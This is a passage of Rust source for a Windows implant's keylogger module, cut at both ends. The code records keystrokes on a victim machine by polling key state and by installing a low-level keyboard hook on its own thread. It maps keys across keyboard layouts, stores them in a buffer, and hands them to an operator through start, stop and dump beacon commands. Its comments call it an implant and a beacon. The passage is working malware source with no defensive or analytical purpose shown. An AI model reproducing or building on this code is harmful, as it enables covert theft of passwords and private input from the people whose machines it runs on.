        0xDB => Some((b'[', b'{')),
        0xDC => Some((b'\\', b'|')),
        0xDD => Some((b']', b'}')),
        0xDE => Some((b'\'', b'"')),
        _ => None,
    };
    pair.map(|(lo, hi)| if shift { hi } else { lo })
}

/// Map a virtual-key code + shift state to a single printable byte using the
/// **active thread's keyboard layout** (arbitrary layout support). Falls back
/// to the legacy US-only [`map_vkey`] when any layout API is unavailable, so
/// the implant degrades to US-correct capture rather than dropping keystrokes.
///
/// Resolves the layout via `GetKeyboardLayout(0)` once per call (cheap — a TLS
/// read), snapshots the full 256-byte keyboard state via `GetKeyboardState`,
/// translates the vk to a scan code via `MapVirtualKeyExW`, then calls
/// `ToUnicodeEx`. The first UTF-16 code unit's low byte is returned (the high
/// byte is dropped — this logger records ASCII-range glyphs only; non-ASCII
/// Unicode output is skipped).
///
/// `ToUnicodeEx`'s `0x04` flag avoids mutating keyboard state, so polling it
/// every keydown-transition has no side effects on the OS keyboard driver.
fn map_vkey_layout_aware(vk: i32, shift: bool) -> Option<u8> {
    // Resolve all four layout exports. If any is missing, fall back.
    let get_layout = get_keyboard_layout_fn()?;
    let get_state = get_keyboard_state_fn()?;
    let map_vk = map_virtual_key_ex_fn()?;
    let to_uni = to_unicode_ex_fn()?;

    // Control / whitespace keys always map 1:1 (no layout dependency).
    match vk {
        0x08 => return Some(0x08),         // Backspace
        0x09 => return Some(0x09),         // Tab
        0x0D => return Some(b'\n'),        // Enter
        0x20 => return Some(b' '),         // Space
        0x10 | 0x11 | 0x12 => return None, // Shift/Ctrl/Alt modifiers
        _ => {}
    }

    // SAFETY: the four fn pointers are valid user32 exports; HKL belongs to
    // the calling thread (the beacon loop thread). The 256-byte keyState and
    // 8-u16 wbuf live on the stack.
    // SAFETY: get_layout(0) returns the current thread's HKL (never null on a
    // GUI-capable thread; on a non-GUI thread it may be the system layout).
    let hkl = unsafe { get_layout(0) };
    if hkl.is_null() {
        return map_vkey(vk, shift);
    }

    let mut key_state: [u8; 256] = [0; 256];
    // SAFETY: key_state is a 256-byte stack buffer, exactly the expected size.
    if unsafe { get_state(key_state.as_mut_ptr()) } == 0 {
        // GetKeyboardState failed (e.g. no input queue on this thread). Fall
        // back to the US table so we still capture something.
        return map_vkey(vk, shift);
    }

    // Scan code for this vk under the active layout.
    // SAFETY: vk is a valid virtual-key code; hkl is a real HKL.
    let scan = unsafe { map_vk(vk as u32, MAPVK_VK_TO_VSC, hkl) };

    // ToUnicodeEx writes up to N UTF-16 code units; we only ever need the first.
    let mut wbuf: [u16; 8] = [0; 8];
    // SAFETY: lpKeyState points to our 256-byte snapshot; wbuf is 8 u16s;
    // flags=0x04 means "don't change keyboard state".
    let n = unsafe {
        to_uni(
            vk as u32,
            scan,
            key_state.as_ptr(),
            wbuf.as_mut_ptr(),
            wbuf.len() as i32,
            TO_UNICODE_FLAGS,
            hkl,
        )
    };
    // n < 0 → dead key (combining diacritic); skip it (no standalone glyph).
    // n == 0 → no translation for this vk in this state; skip.
    // n >= 1 → first code unit is the glyph.
    if n < 1 {
        // Either a dead key or untranslatable — fall back to the US table so
        // US-layout keys still capture on a misidentified layout.
        return map_vkey(vk, shift);
    }
    let code_unit = wbuf[0];
    // Record only the ASCII range. Non-ASCII (e.g. Cyrillic, CJK) would need a
    // wider buffer + UTF-8 encoding; out of scope for the 1-byte ring buffer.
    if code_unit < 0x80 {
        Some(code_unit as u8)
    } else {
        // Non-ASCII glyph — skip rather than corrupt with a truncated byte.
        None
    }
}

/// Append one byte to `BUF` without allocating. Drops the byte if the buffer is
/// already full (oldest data preserved; documented behavior).
///
/// CRITICAL-12: this is the beacon-thread (polling) writer. Once the hook
/// thread is live it is the SOLE writer of BUF — so every byte write here MUST
/// re-check [`hook_is_active`] with Acquire and skip if the hook owns BUF. The
/// top-of-`poll_once` check is an optimization to bail out of the whole scan
/// once the hook is up, but it is NOT sufficient by itself: the hook thread can
/// publish `HOOK_THREAD_LIVE` *during* the 256-key scan, and without this
/// per-write gate the two writers would race the same byte. The Acquire load
/// here pairs with the hook thread's Release store of the flag (set inside
/// `keylog_hook_thread` right after `SetWindowsHookExW`), guaranteeing that if
/// we observe the flag set, the hook thread's subsequent writes are the only
/// ones — we never overlap.
///
/// To eliminate the narrow TOCTOU window (polling path reads the flag false,
/// then the hook thread sets it and writes), the index is reserved via a
/// lock-free `compare_exchange` on `BUF_LEN` — exactly mirroring
/// `buf_push_release`. This gives single-writer-per-byte semantics: each index
/// is uniquely owned by exactly one thread, so no two writes ever target the
/// same byte. The protocol is no_std-safe (pure atomics), cannot deadlock if a
/// writer faults mid-write (the next writer's CAS simply fails and retries or
/// drops), and preserves the drop-newest-when-full contract.
fn buf_push(b: u8) {
    // Per-write gate: if the hook thread owns BUF, this polling write MUST be a
    // no-op. Re-checked on every byte, not just once per scan.
    if hook_is_active() {
        return;
    }
    let len = claim_buf_index();
    // SAFETY: `len < BUF_CAP` (claim_buf_index guarantees it) and `len` was
    // uniquely claimed by THIS thread via the successful CAS, so no other
    // writer can touch BUF[len]. The raw pointer via addr_of_mut! avoids
    // forming a `&mut static mut` (static_mut_refs lint).
    if let Some(len) = len {
        unsafe {
            let ptr: *mut u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
            *ptr.add(len) = b;
        }
    }
}

// ---- public API ------------------------------------------------------------

/// Sample the keyboard once. Called by the beacon loop every cycle; it is a
/// no-op when the keylogger is inactive, so callers can invoke it
/// unconditionally each cycle. When active, it scans all 256 virtual keys,
/// appends each newly-pressed (keydown-transition) printable key to `BUF`, and
/// updates `LAST[vk]` so the transition fires only once per press.
///
/// Never allocates and never panics. Export-resolution failures (user32 not
/// loadable) are swallowed: the cycle is simply a no-op for capture.
pub fn poll_once() {
    if !KEYLOG_ACTIVE.load(Ordering::Relaxed) {
        return;
    }
    // If the hook thread (P2) is live, it's the authoritative writer — skip
    // the polling scan to avoid a redundant race on BUF. The hook callback
    // captures continuously; this poll would only add noise.
    if hook_is_active() {
        return;
    }
    let gaks = match get_async_key_state_fn() {
        Some(f) => f,
        None => return, // user32 unavailable this cycle; try again next time.
    };

    // Determine Shift / CapsLock once for this whole scan.
    // SAFETY: gaks is a valid GetAsyncKeyState pointer.
    let shift = (unsafe { gaks(VK_SHIFT) } & KEY_DOWN_BIT) == KEY_DOWN_BIT;
    // CapsLock is a *toggle*: use GetKeyState (bit 0 = toggle on/off).
    // GetAsyncKeyState bit-0 is "pressed since last call", NOT the toggle state.
    let caps = if let Some(gks) = get_key_state_fn() {
        (unsafe { gks(VK_CAPITAL) } & 0x01) != 0
    } else {
        false // conservative: assume CapsLock off if user32 unavailable
    };
    // Letters are uppercase iff Shift XOR CapsLock.
    let upper_for_letters = shift ^ caps;

    // Raw pointer to LAST so we never form a shared/mut ref to the static.
    // SAFETY: only the beacon thread touches LAST.
    let last_ptr: *mut u8 = core::ptr::addr_of_mut!(LAST).cast::<u8>();

    for vk in 0i32..256 {
        // SAFETY: gaks is a valid GetAsyncKeyState pointer.
        let state = unsafe { gaks(vk) };
        // High bit (0x8000) set => key currently down.
        let down = (state & KEY_DOWN_BIT) == KEY_DOWN_BIT;
        // SAFETY: vk is 0..256, in bounds for the 256-entry array.
        let was = unsafe { *last_ptr.add(vk as usize) };
        unsafe {
            *last_ptr.add(vk as usize) = if down { 1 } else { 0 };
        }

        // Record only on a fresh keydown transition (was up, now down) so a key
        // held across several sleep cycles is captured once, not per sample.
        if down && was == 0 {
            // Use the letter-case rule (Shift XOR Caps) for A-Z, else plain shift.
            // (ToUnicodeEx reads the real keyboard state — which already encodes
            // Caps + Shift — so the layout-aware path ignores this hint; it only
            // matters for the US-table fallback inside map_vkey_layout_aware.)
            let shift_for_this = if (0x41..=0x5A).contains(&vk) {
                upper_for_letters
            } else {
                shift
            };
            if let Some(b) = map_vkey_layout_aware(vk, shift_for_this) {
                buf_push(b);
            }
        }
    }
}

/// Handle `Command::Keylog { action }`: `0`=start, `1`=stop, `2`=dump.
///
/// - start/stop just flip [`KEYLOG_ACTIVE`]; both return `Response::Ok`.
///   Starting does not pre-clear the buffer (a re-start after a dump continues
///   capturing into whatever space remains) and stopping does not discard
///   captured data (use dump to retrieve it).
/// - dump copies the buffered bytes into a `Vec`, returns them as
///   `Response::Output`, and resets the buffer length to 0 (clearing it for the
///   next capture window). An empty buffer yields an empty `Output`, not an
///   error.
/// Spawn the hook thread (P2). Resolves the [`HookRaw`] bundle on the beacon
/// thread, leaks a `KeylogThreadParams` block, and calls `raw_create_thread` to
/// start `keylog_hook_thread`. Sets `HOOK_THREAD_LIVE` on success. Returns
/// `true` if the thread was started.
fn start_hook_thread() -> bool {
    if hook_is_active() {
        return true; // already running
    }
    let raw = match resolve_hook_raw() {
        Some(r) => r,
        None => return false,
    };
    // Allocate + leak the param block. The hook thread reads it; we reclaim on
    // stop (via Box::from_raw) — but if stop never runs, this leaks one block
    // (acceptable for an implant that lives until exit).
    let params: *mut KeylogThreadParams = Box::into_raw(Box::new(KeylogThreadParams {
        raw,
        tid: core::sync::atomic::AtomicU32::new(0),
        exit: core::sync::atomic::AtomicBool::new(false),
        hhook: core::sync::atomic::AtomicUsize::new(0),
    }));
    // SAFETY: raw_create_thread resolves kernel32!CreateThread and spawns the
    // helper. params is a valid pointer to the leaked block.
    let handle = unsafe { crate::sleep::raw_create_thread(keylog_hook_thread, params as usize) };
    let handle = match handle {
        Some(h) => h,
        None => {
            // Thread spawn failed — reclaim the param block.
            unsafe { drop(Box::from_raw(params)) };
            return false;
        }
    };
    HOOK_THREAD_HANDLE.store(handle, Ordering::Release);
    // SAFETY: only the beacon thread writes HOOK_PARAMS.
    unsafe {
        HOOK_PARAMS = params;
    }
    // Spin briefly until the hook thread records its TID (it needs to be
    // running before we can stop it). ~1ms cap.
    for _ in 0..100 {
        let tid = unsafe { (*params).tid.load(Ordering::Acquire) };
        if tid != 0 {
            break;
        }
        // Tiny sleep via nt_delay_execution would pull in syscalls::global()
        // which we want to avoid here on the beacon thread — but this IS the
        // beacon thread, so it's fine. Use a busy-pause instead to keep it
        // trivial; the thread typically publishes its TID within microseconds.
        core::hint::spin_loop();
    }
    // CRITICAL-12: do NOT publish HOOK_THREAD_LIVE from the beacon thread.
    // The hook thread sets it itself (Release, after SetWindowsHookExW) so the
    // flag can never be observed true before the hook thread is actually the
    // sole owner of BUF writes. Wait here for that publication (Acquire) so
    // `start_hook_thread` only returns success once the BUF-write ownership
    // handoff is fully published — a beacon-side `poll_once` running
    // immediately after we return will see HOOK_THREAD_LIVE and skip.
    // If the hook thread failed to install the hook (returned 2 before setting
    // the flag) we fall through after the spin cap and return false so the
    // caller falls back to polling; the thread itself exits and is joined.
    let mut live = false;
    for _ in 0..200 {
        if HOOK_THREAD_LIVE.load(Ordering::Acquire) {
            live = true;
            break;
        }
        core::hint::spin_loop();
    }
    if !live {
        // The hook thread did not publish liveness — either SetWindowsHookExW
        // failed (thread returned 2) or it stalled. Treat as not-started: the
        // polling path stays the writer, and we tear down the failed thread.
        stop_hook_thread();
        return false;
    }
    true
}

/// Stop + join the hook thread (P2). Posts `WM_QUIT` to its message pump,
/// waits for the handle to signal (the thread unhooks on its way out), and
/// reclaims the param block.
fn stop_hook_thread() {
    let handle = HOOK_THREAD_HANDLE.swap(0, Ordering::AcqRel);
    if handle == 0 {
        return; // not running
    }
    let params = unsafe { HOOK_PARAMS };
    if params.is_null() {
        return;
    }
    // Read the TID the hook thread published.
    let tid = unsafe { (*params).tid.load(Ordering::Acquire) };
    if tid != 0 {
        // Post WM_QUIT via raw export (the beacon thread CAN use syscalls, but
        // PostThreadMessageW is a user32 export — resolve it raw to keep
        // symmetry with the hook thread's resolution).
        if let Some(addr) =
            unsafe { crate::resolve::export_addr(b"user32.dll", b"PostThreadMessageW") }
        {
            let f: PostThreadMessageWFn = unsafe { core::mem::transmute(addr) };
            // SAFETY: tid is a real Win32 TID; WM_QUIT takes no payload.
            unsafe { f(tid, WM_QUIT, 0, 0) };
        }
    }
    // Join: WaitForSingleObject via raw kernel32 export. Give it 2s; if the
    // hook thread is stuck (e.g. blocked in GetMessage with no message), the
    // WM_QUIT we just posted should wake it.
    if let Some(wait_addr) =
        unsafe { crate::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject") }
    {
        type WaitFn = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> u32;
        let wait: WaitFn = unsafe { core::mem::transmute(wait_addr) };
        // SAFETY: handle is a real thread handle; 2000ms timeout.
        let _ = unsafe { wait(handle as *mut core::ffi::c_void, 2000) };
    }
    // Close the thread handle via raw kernel32 export.
    if let Some(close_addr) =
        unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") }
    {
        type CloseFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        let close: CloseFn = unsafe { core::mem::transmute(close_addr) };
        // SAFETY: handle was just waited on; closing is safe.
        let _ = unsafe { close(handle as *mut core::ffi::c_void) };
    }
    HOOK_THREAD_LIVE.store(false, Ordering::Release);
    // Reclaim the param block.
    // SAFETY: HOOK_PARAMS is only mutated on the beacon thread; the hook
    // thread has exited (we just joined it).
    unsafe {
        let _ = Box::from_raw(params);
        HOOK_PARAMS = core::ptr::null_mut();
    }
}

pub fn do_keylog(action: u8) -> Response {
    match action {
        0 => {
            KEYLOG_ACTIVE.store(true, Ordering::Relaxed);
            // Try to spawn the hook thread for high-fidelity capture. On
            // failure (user32 export missing), we silently fall back to the
            // polling path (poll_once still runs each cycle). Either way the
            // start is "Ok".
            let _ = start_hook_thread();
            Response::Ok
        }
        1 => {
            KEYLOG_ACTIVE.store(false, Ordering::Relaxed);
            stop_hook_thread();
            Response::Ok
        }
        2 => {
            // Snapshot length, copy [0..len] into a Vec, then reset. Only this
            // path allocates; poll_once stays allocation-free.
            //
            // CRITICAL-12: use `swap(0, AcqRel)` to atomically CLAIM the
            // readable region AND reset the write head in one step. This pairs
            // with the CAS-based writers (`buf_push` / `buf_push_release`):
            //   - A writer that reserved an index < `len` did so with a
            //     successful CAS whose AcqRel store happens-before this swap's
            //     Acquire, so its byte write is visible to the copy below.
            //   - A writer racing this swap either completes its CAS first
            //     (its index is < `len`, included) or sees the reset and
            //     claims a fresh index in the new epoch (excluded).
            //
            // Residual note: if the hook thread is STILL live when a dump is
            // requested, its callback may write a byte at an index in
            // `[0..len)` concurrently with the non-atomic read loop below.
            // Index ownership is still unique per the CAS, so bytes are never
            // torn; on x64 byte stores are atomic so the read sees either the
            // old or the new value. For a fully-sound dump with no concurrent
            // writer, the operator should stop the hook first (action=1). The
            // polling-only path (hook never started) is fully sound.
            let len = BUF_LEN.swap(0, Ordering::AcqRel);
            let mut out: Vec<u8> = Vec::with_capacity(len);
            // SAFETY: len <= BUF_CAP (writers never claim past the cap). Read
            // through a raw pointer to avoid forming a `&static mut`
            // (static_mut_refs lint).
            unsafe {
                let ptr: *const u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
                for i in 0..len {
                    out.push(*ptr.add(i));
                }
            }
            Response::Output(out)
        }
        // Unknown action tag — protocol-valid u8 but not 0/1/2. Surface as Err
        // (matches recon.rs error style) rather than panicking.
        other => Response::Err({
            let mut e = String::new();
            e.push_str("keylog: unknown action ");
            // Decimal-encode the byte without format! (no_std).
            let mut buf = [0u8; 3];
            let mut n = 0usize;
            let mut v = other as u32;
            if v == 0 {
                buf[0] = b'0';
                n = 1;
            } else {
                while v != 0 {
                    n += 1;
                    buf[buf.len() - n] = b'0' + (v % 10) as u8;
                    v /= 10;
                }
            }
            e.push_str(core::str::from_utf8(&buf[buf.len() - n..]).unwrap_or("?"));
            e
        }),
    }
}
